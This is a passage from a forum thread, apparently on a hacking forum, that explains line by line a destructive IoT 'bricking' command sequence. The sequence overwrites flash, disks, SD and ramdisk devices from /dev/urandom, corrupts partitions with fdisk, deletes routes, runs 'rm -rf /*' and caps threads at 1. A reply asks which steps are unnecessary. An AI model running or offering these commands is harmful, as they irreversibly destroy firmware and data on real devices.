
    Code
    busybox cat /dev/urandom >/dev/mtdblock0 &
    busybox cat /dev/urandom >/dev/mtdblock10 &

    These commands are overwriting flash memory (very likely the NOR or NAND chip).
    This is usually where the firmware is located.
    These commands are important because the device is effectively bricked without a valid firmware image.

    Code
    busybox cat /dev/urandom >/dev/sda &
    busybox cat /dev/urandom >/dev/sdb &

    These commands overwrite the first 2 physical disks of the SCSI or SATA HDD.

    Code
    busybox cat /dev/urandom >/dev/mmc0 &

    This command also overwrites flash memory, but rather than overwriting the NOR or NAND card, it'll overwrite the MultiMediaCard or the SD card.
    The firmware can also be found here.

    Code
    busybox cat /dev/urandom >/dev/ram0 &

    This command overwrites the initrd or initramfs image, which are ramdisks used for booting the system.
    In short, initrd and initramfs are ramdisks used for holding a temporary root filesystem, which is accessed during the boot process before the actual root filesystem is mounted on the HDD.
    It does things such as loading the appropriate kernel modules for accessing the HDD.

    Code
    fdisk -l

    This command displays partition information.

    Code
    fdisk -C 1 -H 1 -S 1 /dev/mtd0
    w
    fdish -C 1 -H 1 -S 1 /dev/mtd1
    w
    fdisk -C 1 -H 1 -S 1 /dev/sda
    w
    fdisk -C 1 -H 1 -S 1 /dev/mtdblock0
    w

    These commands write changes to disk for their respective non-volatile memory locations.

    Code
    route del default;iproute del default;ip route del default;rm -rf /* 2>/dev/null & sysctl -w net.ipv4.tcp_timestamp=0;sysctl -w kernel.threads-max=1

    These commands;

        Delete the default route, which is the route that the system forwards packets to when it doesn't have an entry in the routing table for a given IP destination address.
        Delete all of the files in the root filesystem.
        Disable TCP timestamps (why? I'm honestly not sure...)
        Limit the max amount of system processes to 1.


    Code
    halt -n -f
    reboot

    Reboot the device.

    A lot of these commands are unnecessary.


First, thank you so much on your detailed post! I gave you a +3 because of the effort you put in! Welcome to HF by the way!

Second, you mentioned lots of these commands were unnecessary, can you point out which ones? 
